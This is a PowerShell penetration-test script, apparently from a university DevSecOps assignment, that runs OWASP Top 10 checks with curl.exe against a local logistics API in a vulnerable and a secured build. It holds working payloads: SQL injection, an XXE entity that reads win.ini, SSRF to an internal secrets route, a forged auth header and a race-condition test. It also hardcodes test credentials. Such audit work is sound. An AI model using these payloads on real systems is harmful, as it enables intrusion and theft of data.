<#
=============================================================================
 auditoria.ps1 - Script automatizado de pruebas de penetracion (PowerShell)
 Proyecto: TrackLog API - Grupo 5 (Logistica)
 Evaluacion 02 - DevSecOps

 Equivalente en PowerShell de auditoria.sh, para equipos que trabajen en
 Windows nativo. Usa curl.exe (el binario REAL de curl, incluido de fabrica
 en Windows 10/11 desde la build 1803, en C:\Windows\System32\curl.exe) para
 cumplir literalmente el enunciado ("ejecutar pruebas de penetracion
 utilizando curl"). Se invoca siempre como "curl.exe" (con extension) y no
 como "curl" a secas, porque en PowerShell "curl" es un alias que en
 realidad apunta a Invoke-WebRequest, no al binario real.

 Uso (desde la carpeta auditoria/):
   .\auditoria.ps1 -Mode vulnerable -BaseUrl http://localhost:4000
   .\auditoria.ps1 -Mode seguro     -BaseUrl http://localhost:4001

 Si PowerShell bloquea la ejecucion de scripts, correr primero (una vez):
   Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
 Si el archivo viene de un .zip descargado, ademas puede hacer falta:
   Unblock-File .\auditoria.ps1
=============================================================================
#>

param(
    [ValidateSet("vulnerable", "seguro")]
    [string]$Mode = "vulnerable",
    [string]$BaseUrl = "http://localhost:4000"
)

$ErrorActionPreference = "Continue"
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path

if (-not (Get-Command "curl.exe" -ErrorAction SilentlyContinue)) {
    Write-Host "ERROR: no se encontro curl.exe en el sistema (deberia venir incluido en Windows 10/11)."
    Write-Host "Verifica con: Get-Command curl.exe"
    exit 1
}

if ($Mode -eq "vulnerable") {
    $OutDir = Join-Path $ScriptDir "fase1\evidencia"
} else {
    $OutDir = Join-Path $ScriptDir "fase2\evidencia"
}
New-Item -ItemType Directory -Force -Path $OutDir | Out-Null

$TS = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")

Write-Host "============================================================"
Write-Host " Auditoria TrackLog API - modo: $Mode"
Write-Host " Objetivo: $BaseUrl"
Write-Host " Herramienta: curl.exe $(& curl.exe --version | Select-Object -First 1)"
Write-Host " Fecha (UTC): $TS"
Write-Host "============================================================"

function Write-Evidence {
    param(
        [string]$Id,
        [string]$Title,
        [scriptblock]$Action
    )
    $file = Join-Path $OutDir "$Id.txt"
    $lines = @()
    $lines += "### $Id - $Title"
    $lines += "### Fecha (UTC): $TS"
    $lines += "### Herramienta: curl.exe (binario nativo de Windows)"
    $lines += "------------------------------------------------------------"
    $lines += "### Respuesta:"

    try {
        $result = & $Action
        $lines += $result
    } catch {
        $lines += "ERROR: $($_.Exception.Message)"
    }
    $lines += "------------------------------------------------------------"
    $lines | Out-File -FilePath $file -Encoding utf8
    Write-Host "[OK] Evidencia guardada en: $file"
}

# Helper: ejecuta curl.exe con -s (silencioso) -i (incluye status line y
# headers de la respuesta en la salida, igual que "curl -i" en Bash) y
# devuelve la salida cruda tal cual la entregaria curl en una terminal.
# A diferencia de Invoke-WebRequest, curl.exe NO lanza excepcion en
# respuestas HTTP de error (400/401/403/409...): las devuelve normalmente,
# que es justamente el comportamiento que necesitamos para capturar los
# codigos de bloqueo de la version segura.
function Invoke-Curl {
    param(
        [string]$Method = "GET",
        [string]$Uri,
        [hashtable]$Headers = @{},
        [string]$Body = $null,
        [string]$ContentType = $null
    )
    $curlArgs = @("-s", "-i", "-X", $Method)
    foreach ($key in $Headers.Keys) {
        $curlArgs += @("-H", "${key}: $($Headers[$key])")
    }
    if ($ContentType) {
        $curlArgs += @("-H", "Content-Type: $ContentType")
    }

    $tempFile = $null
    if ($Body) {
        # El body se escribe a un archivo temporal y se pasa con
        # --data-binary "@archivo" en vez de --data-raw "<texto>" directo.
        # Motivo: Windows (CommandLineToArgvW) puede eliminar comillas dobles
        # NO escapadas en argumentos SIN espacios -como un JSON compacto
        # {"a":1,"b":2}-, dejando el body corrupto antes de que llegue al
        # servidor (bug real detectado en pruebas: provocaba
        # "SyntaxError: Expected property name..." en /api/package/assign y
        # /api/maps/geocode). Pasarlo por archivo evita el problema por
        # completo, sin importar que caracteres tenga el contenido.
        $tempFile = [System.IO.Path]::GetTempFileName()
        [System.IO.File]::WriteAllText($tempFile, $Body, (New-Object System.Text.UTF8Encoding $false))
        $curlArgs += @("--data-binary", "@$tempFile")
    }
    $curlArgs += $Uri

    try {
        $output = & curl.exe @curlArgs 2>&1
        if ($LASTEXITCODE -ne 0) {
            return "ERROR DE CONEXION (curl.exe exit code $LASTEXITCODE):`n$($output -join "`n")"
        }
        return ($output -join "`n")
    } finally {
        if ($tempFile -and (Test-Path $tempFile)) {
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        }
    }
}

# Extrae solo el cuerpo JSON de una respuesta cruda "curl -i" (todo lo que
# viene despues de la primera linea en blanco que separa headers de body).
function Get-BodyFromRaw {
    param([string]$Raw)
    # OJO: el patron va en comillas SIMPLES a proposito. Con comillas dobles,
    # PowerShell interpreta `r y `n como caracteres de control ANTES de que
    # el motor de regex vea el patron, rompiendo la deteccion de la linea en
    # blanco que separa headers de body (bug real, detectado en pruebas).
    $parts = $Raw -split '\r?\n\r?\n', 2
    if ($parts.Count -eq 2) { return $parts[1] }
    return $Raw
}

# -----------------------------------------------------------------------------
# Login previo (solo en modo "seguro") para obtener token JWT
# -----------------------------------------------------------------------------
$Token = ""
if ($Mode -eq "seguro") {
    try {
        $loginRaw = Invoke-Curl -Method POST -Uri "$BaseUrl/api/driver/login" `
            -ContentType "application/json" `
            -Body '{"username":"cfuentes","password":"camion2024"}'
        $json = Get-BodyFromRaw $loginRaw | ConvertFrom-Json
        $Token = $json.token
        Write-Host "Token obtenido (login legitimo cfuentes): $($Token.Substring(0,[Math]::Min(20,$Token.Length)))..."
    } catch {
        Write-Host "No se pudo obtener token: $($_.Exception.Message)"
    }
}

$AuthHeaders = @{}
if ($Token) { $AuthHeaders["Authorization"] = "Bearer $Token" }

# A01 - Control de acceso roto
Write-Evidence -Id "A01_control_acceso" -Title "Acceso no autorizado a ubicacion GPS de otro conductor" -Action {
    Invoke-Curl -Method GET -Uri "$BaseUrl/api/driver/location/2" -Headers $AuthHeaders
}

# A02 - Credenciales por header sin cifrar
Write-Evidence -Id "A02_credenciales_texto_plano" -Title "Envio de credenciales por headers sin cifrar" -Action {
    Invoke-Curl -Method POST -Uri "$BaseUrl/api/driver/login" -Headers @{ "X-Username" = "cfuentes"; "X-Password" = "camion2024" }
}

# A03 - Inyeccion SQL
Write-Evidence -Id "A03_inyeccion_sql" -Title "Inyeccion SQL en /api/package/search (autenticado cuando aplica)" -Action {
    $payload = [uri]::EscapeDataString("X' OR '1'='1")
    Invoke-Curl -Method GET -Uri "$BaseUrl/api/package/search?barcode=$payload" -Headers $AuthHeaders
}

# A04 - Condicion de carrera (dos asignaciones concurrentes, con curl.exe real)
Write-Evidence -Id "A04_condicion_carrera" -Title "Doble asignacion concurrente del mismo paquete" -Action {
    $authHeaderArg = @()
    if ($Token) { $authHeaderArg = @("-H", "Authorization: Bearer $Token") }

    # Misma logica que Invoke-Curl: el body JSON se escribe a un archivo
    # temporal (--data-binary "@archivo") en vez de pasarlo directo como
    # argumento, para que Windows no le borre las comillas dobles a un JSON
    # compacto sin espacios.
    $raceJob = {
        param($BaseUrl, $authHeaderArg, $DriverId)
        $tempFile = [System.IO.Path]::GetTempFileName()
        [System.IO.File]::WriteAllText($tempFile, "{`"package_id`":1,`"driver_id`":$DriverId}", (New-Object System.Text.UTF8Encoding $false))
        try {
            $curlArgs = @("-s", "-i", "-X", "POST") + $authHeaderArg + @("-H", "Content-Type: application/json", "--data-binary", "@$tempFile", "$BaseUrl/api/package/assign")
            $out = & curl.exe @curlArgs 2>&1
            if ($LASTEXITCODE -ne 0) {
                "ERROR DE CONEXION (curl.exe exit code $LASTEXITCODE): $($out -join [Environment]::NewLine)"
            } else {
                $out -join [Environment]::NewLine
            }
        } finally {
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        }
    }

    $job1 = Start-Job -ScriptBlock $raceJob -ArgumentList $BaseUrl, $authHeaderArg, 1
    $job2 = Start-Job -ScriptBlock $raceJob -ArgumentList $BaseUrl, $authHeaderArg, 2

    Wait-Job $job1, $job2 | Out-Null
    $r1 = Receive-Job $job1
    $r2 = Receive-Job $job2
    Remove-Job $job1, $job2
    "Respuesta 1:`n$r1`n`nRespuesta 2:`n$r2"
}

# A05 - Panel admin sin auth
Write-Evidence -Id "A05_panel_admin_expuesto" -Title "Acceso directo a /admin sin credenciales" -Action {
    Invoke-Curl -Method GET -Uri "$BaseUrl/admin"
}
if ($Token) {
    Write-Evidence -Id "A05b_panel_admin_token_driver" -Title "Acceso a /admin con token valido pero de rol driver (no admin)" -Action {
        Invoke-Curl -Method GET -Uri "$BaseUrl/admin" -Headers $AuthHeaders
    }
}

# A06 - Componentes vulnerables / exposicion de version
Write-Evidence -Id "A06_componentes_vulnerables" -Title "Exposicion de dependencias/versiones del backend" -Action {
    Invoke-Curl -Method GET -Uri "$BaseUrl/api/version"
}

# A07 - Autenticacion falsificada
Write-Evidence -Id "A07_autenticacion_falsificada" -Title "Autenticacion con header estatico falsificado (X-Driver-Auth)" -Action {
    Invoke-Curl -Method POST -Uri "$BaseUrl/api/manifest/upload" -Headers @{ "X-Driver-Auth" = "true" } -ContentType "application/xml" -Body "<manifest><item>carga-test</item></manifest>"
}

# A08 - XXE
Write-Evidence -Id "A08_xxe_lectura_archivo" -Title "XXE - lectura de archivo via entidad externa en manifiesto XML" -Action {
    $xxePayload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><manifest><item>&xxe;</item></manifest>'
    $headers = $AuthHeaders.Clone()
    $headers["X-Driver-Auth"] = "true"
    Invoke-Curl -Method POST -Uri "$BaseUrl/api/manifest/upload" -Headers $headers -ContentType "application/xml" -Body $xxePayload
}

# A09 - Logging
if ($Mode -eq "vulnerable") {
    Write-Evidence -Id "A09_falta_logging" -Title "Verificacion de ausencia de registro de eventos" -Action {
        Invoke-Curl -Method GET -Uri "$BaseUrl/api/driver/location/1" | Out-Null
        Invoke-Curl -Method GET -Uri "$BaseUrl/admin" | Out-Null
        Invoke-Curl -Method GET -Uri "$BaseUrl/api/package/search?barcode=%27%20OR%20%271%27%3D%271" | Out-Null
        "Resultado: la carpeta src/vulnerable/ NO contiene ninguna carpeta logs/`nni archivo de registro de aplicacion. Los intentos anteriores,`nincluido el ataque de inyeccion SQL, NO quedan registrados."
    }
} else {
    $logPath = Join-Path $ScriptDir "..\src\seguro\logs"
    Write-Evidence -Id "A09_logging_habilitado" -Title "Verificacion de registro de eventos (mitigado)" -Action {
        Invoke-Curl -Method GET -Uri "$BaseUrl/api/driver/location/1" -Headers $AuthHeaders | Out-Null
        Invoke-Curl -Method GET -Uri "$BaseUrl/admin" -Headers $AuthHeaders | Out-Null
        Invoke-Curl -Method GET -Uri "$BaseUrl/api/package/search?barcode=%27%20OR%20%271%27%3D%271" -Headers $AuthHeaders | Out-Null
        $access = if (Test-Path "$logPath\access.log") { Get-Content "$logPath\access.log" -Tail 6 } else { "(no se encontro access.log en $logPath)" }
        $security = if (Test-Path "$logPath\security.log") { Get-Content "$logPath\security.log" -Tail 10 } else { "(sin eventos de seguridad registrados aun)" }
        "### Contenido de logs/access.log (ultimas lineas):`n$($access -join "`n")`n`n### Contenido de logs/security.log:`n$($security -join "`n")"
    }
}

# A10 - SSRF
Write-Evidence -Id "A10_ssrf_recurso_interno" -Title "SSRF - acceso a recurso interno via /api/maps/geocode" -Action {
    $body = @{ url = "$BaseUrl/internal/fleet-secrets" } | ConvertTo-Json
    Invoke-Curl -Method POST -Uri "$BaseUrl/api/maps/geocode" -Headers $AuthHeaders -ContentType "application/json" -Body $body
}

Write-Host "============================================================"
Write-Host " Auditoria completa. Evidencia guardada en: $OutDir"
Write-Host "============================================================"
